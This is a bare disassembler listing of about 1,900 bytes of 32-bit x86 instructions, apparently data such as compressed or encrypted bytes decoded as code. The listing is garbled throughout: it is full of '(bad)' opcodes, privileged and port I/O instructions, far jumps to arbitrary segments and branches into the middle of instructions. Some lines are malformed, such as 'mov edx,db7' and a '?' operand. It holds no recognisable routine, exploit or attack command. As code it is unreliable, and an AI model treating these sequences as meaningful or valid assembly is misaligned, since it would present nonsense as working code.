  413f41:	das    
  413f42:	jg     0x413f2b
  413f44:	jo     0x413fb5
  413f46:	xlat   BYTE PTR ds:[ebx]
  413f47:	jmp    0x2b1f:0x64deb808
  413f4e:	xchg   ebp,eax
  413f4f:	mov    al,0x7e
  413f51:	(bad)  
  413f52:	cld    
  413f53:	xor    ah,dl
  413f55:	mov    ah,0x37
  413f57:	aas    
  413f58:	loop   0x413f52
  413f5a:	lock lods eax,DWORD PTR ds:[esi]
  413f5c:	(bad)  
  413f5e:	ror    BYTE PTR [edi+0x1d0ae448],cl
  413f64:	sbb    al,0x87
  413f66:	mov    ds:0xcea6bb62,eax
  413f6b:	push   eax
  413f6c:	mov    ds:0x1ff318c,al
  413f71:	retf   
  413f72:	mov    eax,0x18dd051c
  413f77:	lock or al,0xfa
  413f7a:	scas   al,BYTE PTR es:[edi]
  413f7b:	ins    BYTE PTR es:[edi],dx
  413f7c:	stos   DWORD PTR es:[edi],eax
  413f7d:	sahf   
  413f7e:	test   al,0x3c
  413f80:	jo     0x413fd8
  413f82:	xchg   esi,eax
  413f83:	xor    eax,0x3c6acc4f
  413f88:	jl     0x413f48
  413f8a:	(bad)  
  413f8b:	dec    esi
  413f8c:	fist   DWORD PTR [ebx+ebp*1]
  413f8f:	neg    ebx
  413f91:	or     eax,0xf437b69c
  413f96:	sbb    BYTE PTR [esp+eax*8+0x42cd8369],0xc8
  413f9e:	add    bl,BYTE PTR [esi+0x2f]
  413fa1:	dec    esp
  413fa2:	or     eax,0x5e43005
  413fa7:	xchg   ecx,eax
  413fa8:	gs jl  0x413fda
  413fab:	or     dh,bl
  413fad:	leave  
  413fae:	ror    DWORD PTR [eax],0xe4
  413fb1:	sbb    dl,BYTE PTR [esi]
  413fb3:	dec    ebp
  413fb4:	cmp    DWORD PTR [ebx],edi
  413fb6:	xor    eax,DWORD PTR [ecx-0x4e]
  413fb9:	js     0x413fdd
  413fbb:	(bad)  
  413fbc:	fmul   QWORD PTR [edx]
  413fbe:	cwde   
  413fbf:	jle    0x413fe9
  413fc1:	imul   eax,DWORD PTR [edi-0x35],0xbc622605
  413fc8:	retf   
  413fc9:	nop
  413fca:	push   0xea147ab3
  413fcf:	fbld   TBYTE PTR [edx+0x136a3edd]
  413fd5:	pop    edx
  413fd6:	adc    edi,DWORD PTR [ebp-0x20]
  413fd9:	mov    ebp,0xedd8d269
  413fde:	leave  
  413fdf:	retf   
  413fe0:	je     0x41404d
  413fe2:	retf   
  413fe3:	ret    
  413fe4:	cmp    DWORD PTR [ebp+0x30],ebx
  413fe7:	loop   0x413ffd
  413fe9:	mov    eax,ds:0xdebc2fcc
  413fee:	imul   edi,DWORD PTR gs:[ecx+0x51],0x9553a2cc
  413ff6:	(bad)  
  413ff7:	repnz sti 
  413ff9:	mov    ds:0x923e8a82,al
  413ffe:	jmp    0x67536ff9
  414003:	jno    0x414069
  414005:	xchg   DWORD PTR [edi-0x38],ebp
  414008:	mov    edi,0x9a159b38
  41400d:	xchg   esi,eax
  41400e:	sbb    eax,0x38a46184
  414013:	mov    al,0xaa
  414015:	cmc    
  414016:	sbb    al,0xbd
  414018:	push   ecx
  414019:	pop    eax
  41401a:	jp     0x413fc9
  41401c:	stos   DWORD PTR es:[edi],eax
  41401d:	push   edx
  41401e:	pop    ds
  41401f:	adc    al,0x36
  414021:	lds    esp,FWORD PTR [edx-0x7f]
  414024:	dec    ebx
  414025:	int3   
  414026:	or     eax,0xf7ce7a87
  41402b:	and    edi,ebp
  41402d:	retf   0x63a2
  414030:	add    DWORD PTR ds:0xd62,eax
  414035:	push   ecx
  414036:	sbb    cl,dh
  414038:	push   edx
  414039:	js     0x414038
  41403b:	stos   DWORD PTR es:[edi],eax
  41403c:	mov    esi,0xcb43998d
  414041:	outs   dx,BYTE PTR ds:[esi]
  414042:	inc    esp
  414043:	add    al,0x20
  414045:	retf   0xb991
  414048:	outs   dx,BYTE PTR ds:[esi]
  414049:	int    0xd2
  41404b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41404c:	mov    WORD PTR [eax],cs
  41404e:	push   0x3335d8d8
  414053:	ror    DWORD PTR [esi],1
  414055:	add    eax,0xb0d487b6
  41405a:	push   edx
  41405b:	push   ebx
  41405c:	lods   al,BYTE PTR ds:[esi]
  41405d:	mov    esi,0xe341e581
  414062:	push   0x6b9c1a4c
  414067:	ja     0x414087
  414069:	add    al,0xaf
  41406b:	sub    DWORD PTR [eax+0x32],ebx
  41406e:	test   al,0x3c
  414070:	fidivr WORD PTR [eax-0xa68ea8a]
  414076:	arpl   WORD PTR [eax-0x27],ax
  414079:	(bad)  
  41407a:	xor    al,0xf0
  41407c:	aas    
  41407d:	jo     0x414032
  41407f:	cmp    DWORD PTR [ecx],edx
  414081:	inc    ecx
  414082:	int    0x7a
  414084:	arpl   WORD PTR ds:[edi+esi*8+0x66],bp
  414089:	pop    ebx
  41408a:	pop    es
  41408b:	or     BYTE PTR [edi],ah
  41408d:	xchg   esp,eax
  41408e:	into   
  41408f:	jmp    0xa89e:0xf98f57d
  414096:	adc    eax,0x2784d530
  41409b:	outs   dx,DWORD PTR ds:[esi]
  41409c:	icebp  
  41409d:	inc    edx
  41409e:	cmp    esp,ebp
  4140a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140a1:	and    eax,0xe01925ec
  4140a6:	mov    bh,0xae
  4140a8:	inc    edi
  4140a9:	pushf  
  4140aa:	xor    ebp,ecx
  4140ac:	xlat   BYTE PTR ds:[ebx]
  4140ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ae:	gs (bad) 
  4140b0:	jo     0x414062
  4140b2:	xchg   edx,eax
  4140b3:	out    dx,eax
  4140b4:	imul   ebp,DWORD PTR [ecx],0xb3ecdfee
  4140ba:	sub    DWORD PTR [edx-0x1],esi
  4140bd:	(bad)
  4140c0:	push   0xc1dce9bf
  4140c5:	dec    eax
  4140c6:	bound  eax,QWORD PTR [edx-0x78]
  4140c9:	jmp    FWORD PTR [esi]
  4140cb:	pop    edx
  4140cc:	jbe    0x414137
  4140ce:	iret   
  4140cf:	loop   0x414058
  4140d1:	jbe    0x4140f4
  4140d3:	mov    DWORD PTR [ebp-0x766db0df],0x94bb9515
  4140dd:	mov    DWORD PTR [esi],0xc712f319
  4140e3:	mov    ebx,0xa9da9b12
  4140e8:	loopne 0x414146
  4140ea:	cmp    ebp,DWORD PTR [eax+0x63a61b6e]
  4140f0:	sbb    edx,DWORD PTR ds:[edx]
  4140f3:	fs mov eax,gs
  4140f6:	fidiv  WORD PTR [edi+ebp*2]
  4140f9:	mov    esi,0xaf911745
  4140fe:	and    ebp,esp
  414100:	or     BYTE PTR [edx],ah
  414102:	fimul  WORD PTR [edx-0x49458511]
  414108:	loope  0x414104
  41410a:	push   eax
  41410b:	sub    bh,BYTE PTR [ebx+0x7a]
  41410e:	sbb    ebp,ebx
  414110:	aam    0x4a
  414112:	cwde   
  414113:	retf   0x7a7a
  414116:	jns    0x414156
  414118:	inc    ebx
  414119:	inc    edi
  41411a:	(bad)  
  41411b:	cmp    BYTE PTR [esi],bh
  41411d:	retf   0xb142
  414120:	scas   al,BYTE PTR es:[edi]
  414121:	mov    al,ds:0xf6edca
  414126:	loop   0x414168
  414128:	push   ebp
  414129:	push   esi
  41412a:	or     edi,0xad330e6e
  414130:	jmp    0x4140d2
  414132:	inc    edi
  414133:	iret   
  414134:	xchg   bl,al
  414136:	das    
  414137:	outs   dx,BYTE PTR ds:[esi]
  414138:	mov    cl,0xe2
  41413a:	inc    edx
  41413b:	adc    esp,DWORD PTR [ebx+0x4ae493f0]
  414141:	jo     0x41414a
  414143:	outs   dx,BYTE PTR ds:[esi]
  414144:	aaa    
  414145:	retf   
  414146:	fisttp QWORD PTR [eax]
  414148:	sahf   
  414149:	add    ebp,DWORD PTR [edi-0x4d8b2ec2]
  41414f:	sub    DWORD PTR [esi],ebx
  414151:	sub    BYTE PTR [eax-0x7c],0xe3
  414155:	loopne 0x414169
  414157:	popa   
  414158:	cmp    BYTE PTR ds:0xa3804dd3,dl
  41415e:	push   ebp
  41415f:	pusha  
  414160:	rcr    DWORD PTR [esi],cl
  414162:	aaa    
  414163:	add    eax,0xcf9ec22f
  414168:	sub    ebx,esp
  41416a:	lods   eax,DWORD PTR ds:[esi]
  41416b:	call   FWORD PTR [edx+eiz*4+0x4fed74f6]
  414172:	enter  0x8ce3,0xdc
  414176:	enter  0x9ed4,0x65
  41417a:	add    eax,eax
  41417c:	mov    eax,0xcf0475c4
  414181:	sub    bh,BYTE PTR [eax-0x27]
  414184:	repz aas 
  414186:	push   esp
  414187:	pop    esp
  414188:	mov    bl,0xf9
  41418a:	jbe    0x414202
  41418c:	mov    dl,0x1
  41418e:	mov    ds:0xad1e1d22,al
  414193:	and    eax,0x1ff13b2b
  414198:	mov    al,ds:0x202cb2a2
  41419d:	sub    ecx,DWORD PTR [ecx+esi*8-0x38]
  4141a1:	and    DWORD PTR [ebp-0x6e],edx
  4141a4:	in     al,dx
  4141a5:	repnz cmp bl,BYTE PTR [ebx+0x71]
  4141a9:	xor    BYTE PTR [esi+0x73bffc9a],0x63
  4141b0:	mov    eax,ds:0xb52982d2
  4141b5:	ins    DWORD PTR es:[edi],dx
  4141b6:	pop    es
  4141b7:	fadd   QWORD PTR ds:0x992df1fa
  4141bd:	mov    eax,DWORD PTR [eax-0x57]
  4141c0:	pop    ebp
  4141c1:	out    0x71,al
  4141c3:	ret    
  4141c4:	jp     0x41416c
  4141c6:	jge    0x414238
  4141c8:	xchg   ecx,eax
  4141c9:	or     eax,0x9cd6766b
  4141ce:	cmp    DWORD PTR [ecx+ebx*4],ebp
  4141d1:	pop    esp
  4141d2:	daa    
  4141d3:	and    eax,0x5a0a5ea4
  4141d8:	mov    gs,WORD PTR [edx]
  4141da:	enter  0x6392,0xa6
  4141de:	cmp    al,0x2
  4141e0:	push   eax
  4141e1:	adc    ecx,DWORD PTR ds:0xcf763a40
  4141e7:	push   esp
  4141e8:	retf   
  4141e9:	sbb    ebx,DWORD PTR [edi+0x8b2552e]
  4141ef:	scas   al,BYTE PTR es:[edi]
  4141f0:	pextrw ecx,(bad),0xc5
  4141f2:	dec    ebx
  4141f3:	sub    BYTE PTR [ebx+0x2886a6db],cl
  4141f9:	fst    QWORD PTR [ebp+0x7c]
  4141fc:	lock cmp DWORD PTR ds:0x1ae8e05,ecx
  414203:	mov    ecx,0x4a0eb515
  414208:	mov    al,ds:0x8fd7d12e
  41420d:	loope  0x4141dc
  41420f:	(bad)  
  414210:	popf   
  414211:	iret   
  414212:	adc    ebp,DWORD PTR [ecx-0x45]
  414215:	clc    
  414216:	and    BYTE PTR [ebx-0xa1544d9],0x5f
  41421d:	iret   
  41421e:	dec    ebx
  41421f:	leave  
  414220:	arpl   WORD PTR [eax],si
  414222:	sahf   
  414223:	or     ebx,DWORD PTR ds:0xd31d334e
  414229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41422a:	or     eax,0x7620c515
  41422f:	ja     0x41425e
  414231:	aaa    
  414232:	imul   ch
  414234:	repnz stos DWORD PTR es:[edi],eax
  414236:	out    0x18,al
  414238:	aaa    
  414239:	in     eax,0x2e
  41423b:	daa    
  41423c:	dec    esi
  41423d:	mov    ecx,ecx
  41423f:	imul   ebp,DWORD PTR [ebp-0x1fe6fb2b],0x3469a996
  414249:	or     eax,0xdc321207
  41424e:	in     al,0xdd
  414250:	pop    ss
  414251:	dec    BYTE PTR [ecx]
  414253:	add    edi,DWORD PTR [ebp-0x12930b31]
  414259:	sbb    dh,BYTE PTR [edx+0x7a]
  41425c:	test   BYTE PTR [edx+0xe565c7d],ch
  414262:	scas   eax,DWORD PTR es:[edi]
  414263:	in     al,0x91
  414265:	xor    eax,0x564229f4
  41426a:	xor    eax,0xd167583d
  41426f:	mov    edi,0xdd9f6389
  414274:	jnp    0x41422f
  414276:	daa    
  414277:	xchg   edx,eax
  414278:	pop    ds
  414279:	mov    ds:0x6f7cbe8,eax
  41427e:	mov    esi,0x389d4651
  414283:	cmp    eax,DWORD PTR [edx+ebx*4-0x21]
  414287:	(bad)
  41428b:	mov    BYTE PTR [eax+eiz*2-0x77],bl
  41428f:	je     0x4142d0
  414291:	adc    bh,BYTE PTR [edx+0x67]
  414294:	jne    0x41426f
  414296:	sar    BYTE PTR [ebp+0xa],cl
  414299:	das    
  41429a:	inc    edx
  41429b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41429c:	and    DWORD PTR [edi+0x1d9ca731],ecx
  4142a2:	aad    0x45
  4142a4:	xchg   ecx,eax
  4142a5:	mov    edi,DWORD PTR [edi+ebp*1]
  4142a8:	iret   
  4142a9:	fs stos BYTE PTR es:[edi],al
  4142ab:	xor    BYTE PTR [ebx+0x35],ah
  4142ae:	inc    ebx
  4142af:	in     al,dx
  4142b0:	dec    eax
  4142b1:	scas   al,BYTE PTR es:[edi]
  4142b2:	pop    ebp
  4142b3:	ret    
  4142b4:	jecxz  0x4142e3
  4142b6:	mov    gs,WORD PTR [esi+0x5fe83d89]
  4142bc:	jnp    0x41428f
  4142be:	mov    dh,0x41
  4142c0:	icebp  
  4142c1:	fld    TBYTE PTR [edi-0x79]
  4142c4:	xor    ah,ch
  4142c6:	outs   dx,DWORD PTR ds:[esi]
  4142c7:	(bad)  [edx+edx*4]
  4142ca:	(bad)  
  4142cb:	rol    DWORD PTR [ebp-0x73],cl
  4142ce:	lahf   
  4142cf:	lahf   
  4142d0:	dec    edi
  4142d1:	je     0x4142b6
  4142d3:	jae    0x414273
  4142d5:	leave  
  4142d6:	scas   al,BYTE PTR es:[edi]
  4142d7:	or     ebp,edi
  4142d9:	mov    ds:0xef97224c,al
  4142de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142df:	adc    BYTE PTR [eax+0x2274731],0x73
  4142e6:	inc    esp
  4142e7:	sub    al,0xa3
  4142e9:	dec    edi
  4142ea:	inc    edx
  4142eb:	(bad)  
  4142ec:	or     al,0x3c
  4142ee:	adc    eax,0xff9c952a
  4142f3:	sub    esp,DWORD PTR ds:0x7e26c474
  4142f9:	pushf  
  4142fa:	mov    edx,db7
  4142fd:	push   eax
  4142fe:	mov    DWORD PTR [edi],eax
  414300:	mov    dh,0xb
  414302:	pop    es
  414303:	ja     0x414374
  414305:	pop    es
  414306:	xchg   DWORD PTR [edi+0x6a3f5501],ebp
  41430c:	fmul   DWORD PTR [ecx-0x65485a7e]
  414312:	pop    es
  414313:	adc    DWORD PTR [edx+0x27],esp
  414316:	data16 ss sar cl,1
  41431a:	inc    edi
  41431b:	rol    DWORD PTR [edi-0x7f],0x80
  41431f:	shl    DWORD PTR [esp+ebp*1],1
  414322:	sub    al,0xa0
  414324:	mov    ebp,0x947612bf
  414329:	or     eax,0x95bd9b4e
  41432e:	add    BYTE PTR [ebp-0x56],cl
  414331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414332:	push   ecx
  414333:	loopne 0x41430a
  414335:	or     al,0xf8
  414337:	bound  ebx,QWORD PTR [eax+ebp*8+0x51]
  41433b:	cli    
  41433c:	jle    0x41439e
  41433e:	cmc    
  41433f:	sub    eax,0xdcadd804
  414344:	lahf   
  414345:	jb     0x41435d
  414347:	fst    DWORD PTR [ecx+0x4]
  41434a:	inc    esi
  41434b:	push   ds
  41434c:	add    BYTE PTR [edi+0x36],ch
  41434f:	mov    bh,0x35
  414351:	sahf   
  414352:	cdq    
  414353:	pusha  
  414354:	ds mov dl,0xae
  414358:	popf   
  414359:	jl     0x414367
  41435b:	out    0x99,al
  41435d:	stos   DWORD PTR es:[edi],eax
  41435e:	and    cl,BYTE PTR [edi+ebx*4+0x22]
  414362:	inc    ebx
  414363:	mov    eax,ds:0xbec14a2b
  414368:	dec    esi
  414369:	mov    ds:0x40518784,eax
  41436e:	ror    edi,1
  414370:	out    0x9f,al
  414372:	jecxz  0x414369
  414374:	jle    0x4143d7
  414376:	sbb    al,0x52
  414378:	ret    0xa8c0
  41437b:	ins    BYTE PTR es:[edi],dx
  41437c:	mov    esi,0x269d3e25
  414381:	cmp    DWORD PTR [ebp+ecx*8+0x7d92e79b],edx
  414388:	leave  
  414389:	imul   esp,DWORD PTR [eax+ecx*4+0x280fac9d],0xd3eaf3c2
  414394:	pusha  
  414395:	cs dec eax
  414397:	cli    
  414398:	mov    ch,0x77
  41439a:	xchg   esp,eax
  41439b:	test   DWORD PTR [edx],ecx
  41439d:	jmp    0x1a38:0x85443ff4
  4143a4:	pop    ebx
  4143a5:	and    al,0xc5
  4143a7:	push   ds
  4143a8:	xor    edx,DWORD PTR [ecx+0x72e45ff9]
  4143ae:	hlt    
  4143af:	pop    esp
  4143b0:	fsub   st,st(7)
  4143b2:	test   BYTE PTR [eax-0x23ce15a1],bh
  4143b8:	ss inc eax
  4143ba:	jl     0x41439c
  4143bc:	dec    esp
  4143bd:	pop    esi
  4143be:	daa    
  4143bf:	lds    esi,FWORD PTR [eax+edi*4-0x494ebeb4]
  4143c6:	adc    esp,DWORD PTR [ecx]
  4143c8:	xchg   ebp,eax
  4143c9:	shl    BYTE PTR [esi-0x5c876623],cl
  4143cf:	es aad 0xe5
  4143d2:	or     al,0x54
  4143d4:	rcr    esi,cl
  4143d6:	pusha  
  4143d7:	aaa    
  4143d8:	aam    0xe9
  4143da:	cs jle 0x4143df
  4143dd:	cdq    
  4143de:	or     al,0x91
  4143e0:	and    BYTE PTR [edi+0x47],0xf2
  4143e4:	sub    dl,al
  4143e6:	test   DWORD PTR [ecx+ebp*2],ebp
  4143e9:	xchg   esi,eax
  4143ea:	dec    ebp
  4143eb:	outs   dx,BYTE PTR ds:[esi]
  4143ec:	jmp    0xee5e556b
  4143f1:	gs popf 
  4143f3:	jecxz  0x4143bd
  4143f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f6:	mov    dl,0xd9
  4143f8:	jl     0x414414
  4143fa:	xor    eax,0x1d7d7c49
  4143ff:	sti    
  414400:	out    0x16,eax
  414402:	pop    ecx
  414403:	jmp    0x41447a
  414405:	dec    eax
  414406:	xchg   edi,eax
  414407:	je     0x41439b
  414409:	pusha  
  41440a:	pusha  
  41440b:	sbb    eax,0xb7ecfbbb
  414410:	jns    0x4143ca
  414412:	or     edx,DWORD PTR [eax]
  414414:	scas   eax,DWORD PTR es:[edi]
  414415:	popf   
  414416:	aad    0xcc
  414418:	call   0x1acc4429
  41441d:	jne    0x4143e8
  41441f:	or     DWORD PTR [ebp+esi*1+0x3b70a79e],esp
  414426:	test   DWORD PTR [ebx+eax*8],eax
  414429:	mov    dl,0x35
  41442b:	ja     0x41447d
  41442d:	popa   
  41442e:	cwde   
  41442f:	jmp    0x3042d5cf
  414434:	push   ss
  414435:	inc    ebx
  414436:	(bad)  
  414437:	xchg   ebp,eax
  414438:	into   
  414439:	sub    DWORD PTR [esi+edi*4-0x76],0x70ae0502
  414441:	inc    ebx
  414442:	jno    0x4143d4
  414444:	xor    dh,bh
  414446:	jbe    0x41443a
  414448:	das    
  414449:	stos   BYTE PTR es:[edi],al
  41444a:	add    bh,bl
  41444c:	mov    esp,0x6b112cf5
  414451:	xor    cl,BYTE PTR [ecx+0x4f]
  414454:	jae    0x41441b
  414456:	push   0xffffffe2
  414458:	and    edx,DWORD PTR ss:0xa72878f6
  41445f:	cmp    eax,DWORD PTR [edx+0x1d666a0f]
  414465:	or     DWORD PTR [eax+0x71cec933],eax
  41446b:	dec    eax
  41446c:	scas   eax,DWORD PTR es:[edi]
  41446d:	cmp    eax,0xabeafa8a
  414472:	mov    bh,0x0
  414474:	adc    BYTE PTR [esi-0xa],bl
  414477:	adc    esp,DWORD PTR [edx]
  414479:	in     eax,0x2d
  41447b:	loope  0x4144ca
  41447d:	pop    ebp
  41447e:	stos   DWORD PTR es:[edi],eax
  41447f:	or     edi,DWORD PTR [edx]
  414481:	test   eax,0x218f97a0
  414486:	pusha  
  414487:	cdq    
  414488:	mov    ecx,0xe73aefc2
  41448d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41448e:	dec    edi
  41448f:	outs   dx,DWORD PTR ds:[esi]
  414490:	cld    
  414491:	jge    0x414453
  414493:	and    DWORD PTR [esp+ebx*4],0x76
  414497:	int    0x78
  414499:	hlt    
  41449a:	stc    
  41449b:	and    al,0x85
  41449d:	ins    DWORD PTR es:[edi],dx
  41449e:	pop    ebx
  41449f:	ds sub eax,0xffffffcd
  4144a3:	or     edx,esi
  4144a5:	add    eax,0x4fdcc53a
  4144aa:	in     eax,0x8f
  4144ac:	and    DWORD PTR [edx+0x4c9ab7a9],ebp
  4144b2:	(bad)
  4144b5:	out    dx,al
  4144b6:	jg     0x4144b7
  4144b8:	jl     0x414531
  4144ba:	pop    eax
  4144bb:	out    dx,al
  4144bc:	pop    es
  4144bd:	xchg   ebp,eax
  4144be:	push   0xffffff8c
  4144c0:	xlat   BYTE PTR ds:[ebx]
  4144c1:	aas    
  4144c2:	ja     0x414503
  4144c4:	mov    al,ds:0x2d05c00d
  4144c9:	dec    esp
  4144ca:	push   edi
  4144cb:	shl    DWORD PTR [ebx],cl
  4144cd:	pop    ds
  4144ce:	mov    ah,0x29
  4144d0:	(bad)
  4144d4:	cmp    dh,dh
  4144d6:	ja     0x414462
  4144d8:	nop
  4144d9:	pop    ebp
  4144da:	xchg   esi,eax
  4144db:	sub    ah,ch
  4144dd:	jmp    0xe38e:0xb90c4527
  4144e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144e5:	stos   BYTE PTR es:[edi],al
  4144e6:	sti    
  4144e7:	dec    edi
  4144e8:	xchg   ebp,eax
  4144e9:	or     cl,dl
  4144eb:	xchg   BYTE PTR [edx+0x59],bl
  4144ee:	mov    WORD PTR [ebx],?
  4144f0:	push   ecx
  4144f1:	mov    BYTE PTR [esi-0x2dafa2d9],ch
  4144f7:	ins    DWORD PTR es:[edi],dx
  4144f8:	mov    ebp,0x18470f46
  4144fd:	cmp    ecx,DWORD PTR [ebx-0x60]
  414500:	ret    
  414501:	cmp    bh,ah
  414503:	push   eax
  414504:	ins    DWORD PTR es:[edi],dx
  414505:	fs out dx,al
  414507:	mov    eax,ds:0x4fa60be
  41450c:	xchg   ecx,eax
  41450d:	dec    esi
  41450e:	jl     0x41450e
  414510:	push   esp
  414511:	xchg   ecx,eax
  414512:	jnp    0x414510
  414514:	mov    eax,ds:0x3d65e08d
  414519:	jmp    0x277fff79
  41451e:	sbb    BYTE PTR [esi+eax*4],0xc7
  414522:	inc    edi
  414523:	test   eax,0x8817d999
  414528:	ret    0x6e95
  41452b:	adc    bl,bh
  41452d:	clc    
  41452e:	mov    ecx,gs
  414530:	and    al,0x2b
  414532:	jo     0x41450c
  414534:	push   0xb2a9e4aa
  414539:	jecxz  0x414568
  41453b:	sahf   
  41453c:	sub    ch,BYTE PTR [edi-0xb]
  41453f:	or     ch,dl
  414541:	add    edx,DWORD PTR [ecx+0x256b9f78]
  414547:	jmp    DWORD PTR [esi+0x6ce07f86]
  41454d:	hlt    
  41454e:	and    eax,0xb37b437b
  414553:	fimul  DWORD PTR [ebx+ebp*2]
  414556:	popa   
  414557:	pop    esp
  414558:	sub    cl,BYTE PTR [ecx]
  41455a:	js     0x41458a
  41455c:	and    DWORD PTR [eax-0xb],eax
  41455f:	xor    al,0x77
  414561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414562:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  414564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414565:	ret    
  414566:	add    cl,BYTE PTR [ebx+0x69246566]
  41456c:	xchg   BYTE PTR [edi-0x16],dh
  41456f:	lods   eax,DWORD PTR ds:[esi]
  414570:	push   0x39
  414572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414573:	lods   al,BYTE PTR ds:[esi]
  414574:	popf   
  414575:	jge    0x41456a
  414577:	mov    DWORD PTR [ebx-0x5e],ebx
  41457a:	xor    ah,BYTE PTR [edx+0x7e290163]
  414580:	(bad)
  414583:	adc    ebx,ebp
  414585:	cdq    
  414586:	xchg   edx,ecx
  414588:	lods   eax,DWORD PTR ds:[esi]
  414589:	cmp    ecx,ecx
  41458b:	push   0x6c4287ab
  414590:	rol    BYTE PTR [ebx],1
  414592:	jg     0x414557
  414594:	push   cs
  414595:	mov    bh,0x89
  414597:	fidiv  DWORD PTR [edx]
  414599:	mov    esp,0x7d468f9f
  41459e:	inc    esp
  41459f:	adc    DWORD PTR [edx-0xc1bb1d],edi
  4145a5:	pop    esi
  4145a6:	mov    cs,WORD PTR [esi-0x61c3a2e]
  4145ac:	pusha  
  4145ad:	ins    DWORD PTR es:[edi],dx
  4145ae:	mov    eax,0x4f2c2e8
  4145b3:	aas    
  4145b4:	add    BYTE PTR [esi-0x7a1e42ac],bh
  4145ba:	dec    ecx
  4145bb:	outs   dx,BYTE PTR ds:[esi]
  4145bc:	sbb    BYTE PTR [eax-0x36],cl
  4145bf:	jmp    0xb57ba294
  4145c4:	out    dx,eax
  4145c5:	pop    ecx
  4145c6:	into   
  4145c7:	push   edx
  4145c8:	in     al,0x58
  4145ca:	repnz pop ecx
  4145cc:	ficom  WORD PTR [ebx]
  4145ce:	adc    eax,0x4488575a
  4145d3:	clc    
  4145d4:	inc    ebx
  4145d5:	xchg   esi,eax
  4145d6:	mov    esi,0xdd0040ad
  4145db:	in     al,0xe0
  4145dd:	mov    BYTE PTR [esi],0xc2
  4145e0:	inc    ebx
  4145e1:	mov    WORD PTR [ebp+0x19],ds
  4145e4:	jb     0x41462c
  4145e6:	lds    ebx,FWORD PTR [ebx-0x72]
  4145e9:	clc    
  4145ea:	sbb    bl,al
  4145ec:	mov    ds:0x3f01d9ff,eax
  4145f1:	(bad)  
  4145f2:	pop    ebx
  4145f3:	repnz ficom WORD PTR [edx+ebx*1]
  4145f7:	add    ebp,DWORD PTR [esi]
  4145f9:	add    al,0x62
  4145fb:	inc    eax
  4145fc:	adc    eax,0x46bac038
  414601:	daa    
  414602:	jmp    0x414635
  414604:	aad    0x7f
  414606:	scas   al,BYTE PTR es:[edi]
  414607:	into   
  414608:	(bad)  
  414609:	fcomi  st,st(3)
  41460b:	or     al,BYTE PTR [edi+0x584cbec6]
  414611:	jecxz  0x41460e
  414613:	mov    eax,0x70268b8f
  414618:	add    esi,DWORD PTR [edx]
  41461a:	and    al,bl
  41461c:	stos   DWORD PTR es:[edi],eax
  41461d:	xchg   edi,eax
  41461e:	push   esp
  41461f:	xor    dl,BYTE PTR [ebx+0x6238db98]
  414625:	pop    edx
  414626:	and    dl,BYTE PTR [edx+0x574bcad2]
  41462c:	scas   al,BYTE PTR es:[edi]
  41462d:	jmp    0x4145bd
  41462f:	inc    edi
  414630:	mov    eax,ds:0x79c06d82
  414635:	mov    eax,0x53f44ac0
  41463a:	jo     0x41463e
  41463c:	ds lock out dx,al
  41463f:	call   0x7f8e2b5
  414644:	sub    al,0x9b
  414646:	test   DWORD PTR [esi],eax
  414648:	cmp    DWORD PTR [ecx+0x67ce11d6],edx
  41464e:	pop    edx
  41464f:	test   DWORD PTR [edx+0x75],esp
  414652:	aas    
  414653:	ficomp WORD PTR [edx-0x4139db20]
  414659:	(bad)  
  41465a:	js     0x414669
  41465c:	test   DWORD PTR [eax],esp
  41465e:	leave  
  41465f:	ss pop ecx
  414661:	jmp    0x4145ed
  414663:	mov    WORD PTR [esi-0x3],gs
  414666:	mov    eax,ds:0x1c6b3553
  41466b:	jns    0x414616
  41466d:	sub    dh,ah
  41466f:	jecxz  0x4146dd
  414671:	jo     0x41463a
  414673:	pop    ebx
  414674:	adc    DWORD PTR [ebx],ebp
  414676:	or     eax,0x8c3fe7a
  41467b:	mov    edx,0xd4bddd0f
  414680:	sbb    ch,ah
  414682:	sub    al,0x2a
  414684:	and    bl,BYTE PTR [ecx-0x212e052f]
  41468a:	mov    al,ds:0x266584fe
  41468f:	stc    
  414690:	outs   dx,BYTE PTR ds:[esi]
  414691:	mov    ds:0x18a0716c,eax
  414696:	xor    esi,DWORD PTR [edx+edx*8+0x36f4aa10]
  41469d:	and    BYTE PTR [edi-0x66],bl
  4146a0:	daa    
  4146a1:	jo     0x414632
  4146a3:	mov    ah,0x5c
  4146a5:	out    0x8b,eax
  4146a7:	xor    edx,DWORD PTR [eax+0xf]
  4146aa:	dec    eax
  4146ab:	mov    esi,eax
  4146ad:	cld    
  4146ae:	and    al,0x41
  4146b0:	in     al,0x5a
  4146b2:	(bad)  
  4146b3:	mov    ds:0xe104c7c3,eax
  4146b8:	pop    ebp
  4146b9:	fidiv  DWORD PTR es:[eax]
  4146bc:	jecxz  0x41467e
  4146be:	ficom  WORD PTR [edi+edx*2+0x70]
  4146c2:	imul   ebx,DWORD PTR [edi],0x666b6f01
  4146c8:	cdq    
  4146c9:	int    0x44
  4146cb:	add    BYTE PTR [ebp+0x1f],dh
  4146ce:	sub    cl,BYTE PTR [eax]
  4146d0:	les    edi,FWORD PTR [esi-0x25fe7104]
  4146d6:	pop    edx
  4146d7:	sbb    esi,ecx
  4146d9:	rcr    BYTE PTR [edi-0x13],cl
  4146dc:	pop    ds
  4146dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146de:	mov    edi,0x7b5b9ca9
  4146e3:	mov    al,ds:0x29be1e4
  4146e8:	jmp    0x414725
  4146ea:	mov    ?,WORD PTR ds:0xba389b3
  4146f0:	mov    bl,BYTE PTR [ebx+0x34]
  4146f3:	inc    ebx
  4146f4:	mov    bl,0xc9
  4146f6:	out    dx,eax
  4146f7:	add    BYTE PTR [ebx+0x5f],dl
  4146fa:	icebp  
